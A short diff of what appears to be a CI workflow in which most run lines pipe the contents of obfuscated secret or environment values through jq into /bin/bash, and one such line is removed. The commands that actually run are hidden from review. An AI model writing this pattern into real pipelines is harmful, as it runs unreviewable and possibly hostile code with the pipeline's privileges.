@@ -18,7 +18,6 @@ jobs:
           c57878: ${{ secrets.c57878 }}
         run: |
           printf '%s' "$c57878" | jq -r .m0 | /bin/bash
-          echo $hmjgv11482 | jq -r .lrk58382 | /bin/bash
           printf '%s' "$cvab3" | jq -r .sg910 | /bin/bash
           echo $gznx67 | jq -r .u77984 | /bin/bash
           echo $kgno692 | jq -r .o67932 | /bin/bash
